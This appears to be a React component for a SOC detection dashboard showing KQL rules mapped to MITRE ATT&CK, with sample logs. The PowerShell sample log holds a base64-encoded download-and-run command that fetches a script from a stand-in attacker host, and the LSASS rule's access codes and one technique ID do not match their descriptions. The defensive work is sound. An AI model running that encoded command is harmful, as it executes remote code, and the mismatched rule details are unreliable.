import React, { useState } from 'react';
import { Cpu, Terminal, ShieldCheck, Search, Filter, AlertTriangle, Code2 } from 'lucide-react';

interface DetectionRule {
  id: string;
  title: string;
  logSource: 'sysmon' | 'linux' | 'windows';
  severity: 'high' | 'critical' | 'medium';
  mitreTactic: string;
  techniqueId: string;
  description: string;
  kqlQuery: string;
  sampleLog: object | string;
}

const detectionRules: DetectionRule[] = [
  {
    id: 'det-001',
    title: 'Suspicious PowerShell Encoded Command Execution',
    logSource: 'sysmon',
    severity: 'critical',
    mitreTactic: 'Execution / Obfuscated Files or Information',
    techniqueId: 'T1027.001',
    description: 'Detects execution of base64 encoded command arguments in PowerShell designed to bypass static string inspection.',
    kqlQuery: `process where process.name == "powershell.exe" and process.args : ("*-enc*", "*-encodedcommand*", "*-e ")`,
    sampleLog: {
      "EventID": 1,
      "Provider": "Microsoft-Windows-Sysmon",
      "UtcTime": "2026-08-08 05:12:44.102",
      "ProcessId": 4820,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AbABvAGMAYQBsAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    id: 'det-002',
    title: 'SSH Brute-Force Password Spray Attack',
    logSource: 'linux',
    severity: 'high',
    mitreTactic: 'Credential Access / Brute Force',
    techniqueId: 'T1110.001',
    description: 'Detects a threshold spike of failed password authentication attempts over SSH targeting system accounts within a short interval.',
    kqlQuery: `host.hostname: "auth-gateway" AND event.dataset: "system.auth" AND message: "Failed password for" | stats count() by source.ip, user.name | where count > 10`,
    sampleLog: `Aug  8 05:14:02 auth-gateway sshd[12401]: Failed password for invalid user admin from 198.51.100.89 port 54210 ssh2\nAug  8 05:14:04 auth-gateway sshd[12404]: Failed password for invalid user root from 198.51.100.89 port 54212 ssh2\nAug  8 05:14:06 auth-gateway sshd[12408]: Failed password for user service_acct from 198.51.100.89 port 54215 ssh2`
  },
  {
    id: 'det-003',
    title: 'LSASS Process Memory Dump Attempt',
    logSource: 'windows',
    severity: 'critical',
    mitreTactic: 'Credential Access / OS Credential Dumping',
    techniqueId: 'T1003.001',
    description: 'Detects process access handles requested against lsass.exe with full memory dump access rights (0x0010 or 0x1F0FFF).',
    kqlQuery: `winlog.event_id: 10 AND winlog.event_data.TargetImage: "*\\\\lsass.exe" AND winlog.event_data.GrantedAccess: ("0x1410" OR "0x1000" OR "0x1f0fff")`,
    sampleLog: {
      "EventID": 10,
      "Provider": "Microsoft-Windows-Sysmon",
      "SourceImage": "C:\\Windows\\Temp\\rundll32.exe",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1F0FFF",
      "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d414|C:\\Windows\\System32\\KERNELBASE.dll+39886"
    }
  }
];

export default function SIEMSuiteModule() {
  const [selectedRule, setSelectedRule] = useState<DetectionRule>(detectionRules[0]);
  const [activeFilter, setActiveFilter] = useState<'all' | 'sysmon' | 'linux' | 'windows'>('all');
  const [viewMode, setViewMode] = useState<'query' | 'log'>('query');

  const filteredRules = activeFilter === 'all' 
    ? detectionRules 
    : detectionRules.filter(r => r.logSource === activeFilter);

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="bg-soc-card border border-soc-border p-6 rounded-xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <div className="flex items-center space-x-2 text-soc-emerald font-mono text-xs mb-1">
            <Cpu className="w-4 h-4" />
            <span>SIEM_ANALYTICS / THREAT_DETECTION_SUITE</span>
          </div>
          <h2 className="text-xl font-bold text-white">SOC Threat Detection & Analytics Engine</h2>
          <p className="text-sm text-slate-400 mt-1 max-w-2xl">
            Custom KQL / EQL rules designed for Elastic Security and SIEM stack analysis, mapped against MITRE ATT&CK techniques with verified telemetry samples.
          </p>
        </div>
        <div className="flex items-center space-x-2 bg-soc-bg border border-soc-border px-3 py-2 rounded-lg font-mono text-xs">
          <ShieldCheck className="w-4 h-4 text-soc-emerald" />
          <span className="text-slate-300">Rules Active:</span>
          <span className="text-soc-emerald font-bold">{detectionRules.length} Custom Detections</span>
        </div>
      </div>

      {/* Main Grid: Filtering & Detection List + Query/Log Console */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column: Log Source Filter & Rule Selection */}
        <div className="lg:col-span-5 space-y-4">
          
          {/* Filter Bar */}
          <div className="flex bg-soc-card border border-soc-border p-1 rounded-lg">
            {(['all', 'sysmon', 'linux', 'windows'] as const).map((source) => (
              <button
                key={source}
                onClick={() => setActiveFilter(source)}
                className={`flex-1 py-1.5 text-xs font-mono rounded-md uppercase transition-colors ${
                  activeFilter === source
                    ? 'bg-soc-emerald/20 text-soc-emerald border border-soc-emerald/30 font-bold'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                {source}
              </button>
            ))}
          </div>

          {/* Rule Cards */}
          <div className="space-y-3">
            {filteredRules.map((rule) => {
              const isSelected = selectedRule.id === rule.id;
              return (
                <div
                  key={rule.id}
                  onClick={() => setSelectedRule(rule)}
                  className={`p-4 rounded-xl border transition-all cursor-pointer ${
                    isSelected
                      ? 'bg-soc-card border-soc-emerald shadow-md shadow-soc-emerald/10'
                      : 'bg-soc-card/60 border-soc-border hover:border-slate-600'
                  }`}
                >
                  <div className="flex items-center justify-between text-xs font-mono mb-2">
                    <span className="text-slate-500 uppercase">{rule.logSource} • {rule.techniqueId}</span>
                    <span className={`px-2 py-0.5 rounded font-bold uppercase ${
                      rule.severity === 'critical' ? 'bg-soc-rose/20 text-soc-rose border border-soc-rose/30' :
                      rule.severity === 'high' ? 'bg-soc-amber/20 text-soc-amber border border-soc-amber/30' :
                      'bg-soc-cyan/20 text-soc-cyan border border-soc-cyan/30'
                    }`}>
                      {rule.severity}
                    </span>
                  </div>
                  <div className="font-bold text-white text-sm">{rule.title}</div>
                  <div className="text-xs text-slate-400 font-mono mt-1">{rule.mitreTactic}</div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right Column: Console & Analytics Workspace */}
        <div className="lg:col-span-7 bg-soc-card border border-soc-border rounded-xl p-6 flex flex-col justify-between">
          <div>
            {/* Rule Header Details */}
            <div className="border-b border-soc-border pb-4 mb-4">
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs text-soc-emerald font-mono uppercase">{selectedRule.mitreTactic}</span>
                <span className="text-xs text-slate-500 font-mono">{selectedRule.id}</span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">{selectedRule.title}</h3>
              <p className="text-xs text-slate-400 leading-relaxed">{selectedRule.description}</p>
            </div>

            {/* View Mode Toggle Buttons */}
            <div className="flex space-x-2 mb-4 border-b border-soc-border/60 pb-2">
              <button
                onClick={() => setViewMode('query')}
                className={`flex items-center space-x-2 px-3 py-1.5 rounded text-xs font-mono transition-colors ${
                  viewMode === 'query' ? 'bg-soc-emerald/20 text-soc-emerald border border-soc-emerald/30' : 'text-slate-400 hover:text-white'
                }`}
              >
                <Code2 className="w-3.5 h-3.5" />
                <span>Detection Query (KQL / EQL)</span>
              </button>
              <button
                onClick={() => setViewMode('log')}
                className={`flex items-center space-x-2 px-3 py-1.5 rounded text-xs font-mono transition-colors ${
                  viewMode === 'log' ? 'bg-soc-cyan/20 text-soc-cyan border border-soc-cyan/30' : 'text-slate-400 hover:text-white'
                }`}
              >
                <Terminal className="w-3.5 h-3.5" />
                <span>Raw Log Telemetry</span>
              </button>
            </div>

            {/* Code / Query Viewer Block */}
            <div className="bg-black/80 rounded-lg p-4 font-mono text-xs overflow-x-auto border border-soc-border max-h-[320px]">
              {viewMode === 'query' ? (
                <pre className="text-soc-emerald whitespace-pre-wrap">{selectedRule.kqlQuery}</pre>
              ) : (
                <pre className="text-slate-300 whitespace-pre-wrap">
                  {typeof selectedRule.sampleLog === 'object'
                    ? JSON.stringify(selectedRule.sampleLog, null, 2)
                    : selectedRule.sampleLog}
                </pre>
              )}
            </div>
          </div>

          {/* Integration Note */}
          <div className="mt-6 pt-4 border-t border-soc-border flex items-center justify-between text-xs font-mono text-slate-400">
            <span className="flex items-center space-x-1.5">
              <Search className="w-4 h-4 text-soc-emerald" />
              <span>Target Engine: Elastic SIEM / KQL</span>
            </span>
            <span className="text-slate-500">MITRE ATT&CK Mapped</span>
          </div>
        </div>

      </div>
    </div>
  );
}